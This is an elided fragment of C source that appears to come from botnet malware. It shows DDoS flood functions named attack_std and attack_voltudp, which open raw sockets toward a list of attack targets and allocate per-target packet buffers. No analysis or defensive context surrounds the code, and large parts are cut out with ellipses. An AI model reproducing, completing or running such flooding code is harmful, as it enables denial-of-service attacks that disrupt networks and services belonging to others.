...
void attack_std(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    ...
    for (i = 0; i < targs_len; i++)
    {
        ...
        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next() +  0xffffffff;
        else
            targs[i].sock_addr.sin_port = htons(dport);
        if ((fds[i] = socket(AF_INET, SOCK_RAW, 0)) == -1)
        {
            return;
        }
...
void attack_voltudp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));
